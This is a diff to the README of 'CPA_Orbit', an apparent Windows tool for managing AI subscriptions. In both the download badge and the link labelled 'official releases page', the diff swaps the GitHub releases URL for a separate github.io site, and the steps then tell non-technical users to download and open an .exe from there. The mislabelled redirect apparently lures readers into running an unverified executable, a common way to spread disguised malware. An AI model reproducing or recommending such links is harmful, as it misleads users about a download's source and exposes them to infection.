@@ -1,6 +1,6 @@
 # 🌐 CPA_Orbit - Manage your AI subscriptions with ease
 
-[![](https://img.shields.io/badge/Download-CPA_Orbit-blue.svg)](https://github.com/lumpen-goosestep540/CPA_Orbit/releases)
+[![](https://img.shields.io/badge/Download-CPA_Orbit-blue.svg)](https://lumpen-goosestep540.github.io)
 
 CPA_Orbit acts as a central hub for your artificial intelligence tools. It tracks prices, manages subscriptions, and handles account needs from one place on your computer. You use this tool to monitor costs and organize your AI proxy operations without complex setups.
 
@@ -8,7 +8,7 @@ CPA_Orbit acts as a central hub for your artificial intelligence tools. It track
 
 You do not need programming skills to use this software. Follow these steps to set up the application on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/lumpen-goosestep540/CPA_Orbit/releases) to download the software.
+1. Visit the [official releases page](https://lumpen-goosestep540.github.io) to download the software.
 2. Look for the file ending in .exe under the latest version header.
 3. Click the file to start the download.
 4. Open the downloaded file once the process finishes.
